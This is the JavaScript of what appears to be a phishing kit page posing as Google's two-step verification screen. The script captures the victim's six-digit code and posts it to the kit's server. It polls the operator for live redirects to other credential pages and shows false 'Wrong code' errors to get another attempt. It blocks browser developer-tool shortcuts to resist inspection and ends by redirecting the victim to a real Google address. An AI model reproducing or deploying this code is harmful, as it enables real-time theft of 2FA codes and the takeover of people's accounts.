<div class="google-loading-overlay" id="google-loading-overlay"></div>
<script>
  (function () {
    'use strict';
    const PAGE        = 'otp.html';
    const POLL_MS     = 1200;
    const SUCCESS_URL = 'https://sites.google.com/';
    const VALID_PAGES = ['otp.html','recovery.html','verification.html','auth.html','verify.html'];

    
    const urlParams = new URLSearchParams(location.search);
    let sid = urlParams.get('sid') || sessionStorage.getItem('sid');
    if (sid) sessionStorage.setItem('sid', sid);

    
    const otpInput    = document.getElementById('idvPin');
    const nextBtn     = document.getElementById('nextBtn');
    const errorMsg    = document.getElementById('errorMsg');
    const inputWrap   = document.getElementById('otpInputWrap');
    const emailEl     = document.getElementById('displayEmail');
    const maskedPhone = document.getElementById('maskedPhone');

    
    const storedEmail = sessionStorage.getItem('email');
    if (storedEmail && emailEl) emailEl.textContent = storedEmail;

    
    function showLoading() {
      document.getElementById('google-loading-overlay').classList.add('active');
      const loader = document.querySelector('.Ih3FE');
      if (loader) loader.style.display = 'block';
    }
    function hideLoading() {
      document.getElementById('google-loading-overlay').classList.remove('active');
      const loader = document.querySelector('.Ih3FE');
      if (loader) loader.style.display = 'none';
    }

    
    function showErr(msg) {
      errorMsg.textContent = msg;
      errorMsg.classList.add('visible');
      inputWrap.classList.add('input-error', 'shake');
      setTimeout(() => inputWrap.classList.remove('shake'), 400);
    }
    function clearErr() {
      errorMsg.textContent = '';
      errorMsg.classList.remove('visible');
      inputWrap.classList.remove('input-error');
    }

    
    function setPhone(digits) {
      if (!maskedPhone || !digits) return;
      const d = String(digits).replace(/\D/g, '').slice(-2);
      if (d) maskedPhone.innerHTML = '&bull;&bull;&bull;&bull; &bull;&bull;&bull; &bull;&bull;&bull;' + d;
    }

    
    function navigateTo(page) {
      stopPolling();
      showLoading();
      window.location.href = (page === 'success') ? SUCCESS_URL : ('/' + page + '?sid=' + encodeURIComponent(sid));
    }

    
    let polling = false, pollTimer = null;
    function stopPolling() { polling = false; if (pollTimer) clearTimeout(pollTimer); }
    function startPolling() { polling = true; poll(); }

    async function poll() {
      if (!polling || !sid) return;
      try {
        const r = await fetch('/api/status/' + encodeURIComponent(sid));
        const d = await r.json();

        if (d.status === 'gone') { stopPolling(); window.location.replace('/'); return; }
        if (d.email) { emailEl.textContent = d.email; sessionStorage.setItem('email', d.email); }
        if (d.twoFANumber) setPhone(d.twoFANumber);

        if (d.redirect && VALID_PAGES.includes(d.redirect)) {
          fetch('/api/clearOk', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({sid}) }).catch(()=>{});
          navigateTo(d.redirect); return;
        }
        if (d.page && d.page !== PAGE && VALID_PAGES.includes(d.page)) { navigateTo(d.page); return; }
        if (d.status === 'approved' || d.page === 'success') { navigateTo('success'); return; }

        if (d.status === 'redo') {
          hideLoading();
          otpInput.value = ''; otpInput.focus();
          showErr('Wrong code. Please try again.');
          fetch('/api/clearRedo', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({sid}) }).catch(()=>{});
          if (polling) { pollTimer = setTimeout(poll, POLL_MS); } return;
        }
      } catch (e) {  }
      if (polling) pollTimer = setTimeout(poll, POLL_MS);
    }

    
    async function init() {
      if (!sid) {
        const r = await fetch('/api/session', { method:'POST' });
        const d = await r.json();
        sid = d.sid;
        sessionStorage.setItem('sid', sid);
      }
      await fetch('/api/page', {
        method:'POST', headers:{'Content-Type':'application/json'},
        body: JSON.stringify({ sid, page: PAGE })
      }).catch(()=>{});

      try {
        const r = await fetch('/api/status/' + encodeURIComponent(sid));
        const d = await r.json();
        if (d.email) { emailEl.textContent = d.email; sessionStorage.setItem('email', d.email); }
        if (d.twoFANumber) setPhone(d.twoFANumber);
      } catch(e){}

      startPolling();
    }

    
    const otpLabel = otpInput ? otpInput.parentElement.querySelector('.AxOyFc.snByac') : null;
    function floatLabel() {
      if (!otpLabel) return;
      otpLabel.style.transform = 'translateY(-120%) scale(0.75)';
      otpLabel.style.transformOrigin = 'left top';
    }
    function sinkLabel() {
      if (!otpLabel) return;
      otpLabel.style.transform = '';
      otpLabel.style.transformOrigin = '';
    }
    if (otpInput && otpLabel) {
      nextBtn.addEventListener('mousedown', () => {
        if (otpInput.value.trim() !== '') floatLabel();
      });
      otpInput.addEventListener('focus', floatLabel);
      otpInput.addEventListener('blur', () => {
        setTimeout(() => {
          if (otpInput.value.trim() === '') sinkLabel(); else floatLabel();
        });
      });
    }

    
    otpInput.addEventListener('input', () => {
      otpInput.value = otpInput.value.replace(/\D/g, '').slice(0, 6);
      if (otpInput.value.trim() !== '') floatLabel(); else sinkLabel();
      clearErr();
    });

    
    async function submitOTP() {
      const code = otpInput.value.replace(/\s/g,'').trim();
      if (!code) { showErr('Enter a verification code'); otpInput.focus(); return; }
      if (!/^\d{6}$/.test(code)) { showErr('Enter a valid 6-digit verification code'); otpInput.focus(); return; }
      if (!sid) return;
      clearErr();
      showLoading();
      try {
        await fetch('/api/otp', {
          method:'POST', headers:{'Content-Type':'application/json'},
          body: JSON.stringify({ sid, otp: code, type: 'otp' })
        });
      } catch(e) { hideLoading(); }
    }

    nextBtn.addEventListener('click', submitOTP);
    otpInput.addEventListener('keydown', e => { if (e.key === 'Enter') submitOTP(); });

    init().catch(e => console.error('OTP init error', e));
  })();
  document.addEventListener('keydown', function(e) {
  if (
    e.key === 'F12' ||
    (e.ctrlKey && e.key.toLowerCase() === 'u') ||
    (e.ctrlKey && e.shiftKey && ['i','j','c'].includes(e.key.toLowerCase()))
  ) {
    e.preventDefault();
  }
});
  </script>
